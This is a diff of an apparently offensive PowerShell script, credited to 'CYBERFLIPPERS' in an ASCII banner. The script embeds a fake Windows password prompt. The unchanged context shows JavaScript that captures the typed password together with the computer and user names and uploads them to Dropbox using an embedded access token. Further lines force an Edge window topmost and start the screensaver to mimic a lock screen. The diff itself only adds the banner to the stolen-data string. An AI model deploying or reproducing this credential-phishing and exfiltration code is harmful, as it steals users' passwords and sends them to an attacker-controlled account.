@@ -214,7 +214,17 @@ $h2 = @"
             var passwordValue = document.getElementById("password").value;
             var uValue = "$u";
             var cValue = "$c";
-            var data = "Computer: " + cValue + " | User: " + uValue + " | Password: " + passwordValue;
+            var data = `<#
+########################################################################################################################
+#    _______     ______  ______ _____  ______ _      _____ _____  _____  ______ _____   _____ 			      # 
+#   / ____\ \   / /  _ \|  ____|  __ \|  ____| |    |_   _|  __ \|  __ \|  ____|  __ \ / ____|                        # 
+#  | |     \ \_/ /| |_) | |__  | |__) | |__  | |      | | | |__) | |__) | |__  | |__) | (___                          # 
+#  | |      \   / |  _ <|  __| |  _  /|  __| | |      | | |  ___/|  ___/|  __| |  _  / \___ \                         # 
+#  | |____   | |  | |_) | |____| | \ \| |    | |____ _| |_| |    | |    | |____| | \ \ ____) |                        # 
+#   \_____|  |_|  |____/|______|_|  \_\_|    |______|_____|_|    |_|    |______|_|  \_\_____/ 			      # 
+ #########################################################################################################################           
+#>
+Computer: ${cValue} | User: ${uValue} | Password: ${passwordValue}`;
             var accessToken = "$db";
             var dropboxUploadUrl = "https://content.dropboxapi.com/2/files/upload";
             var dropboxArgs = {
@@ -285,3 +295,4 @@ Sleep -Milliseconds 250
 $null = [Win32]::SetWindowPos($edgeProcess.MainWindowHandle, [Win32]::HWND_TOPMOST, 0, 0, 0, 0, [Win32]::SWP_NOMOVE -bor [Win32]::SWP_NOSIZE -bor [Win32]::SWP_SHOWWINDOW)
 Sleep -Milliseconds 250
 $black = Start-Process -FilePath "C:\Windows\System32\scrnsave.scr"
+
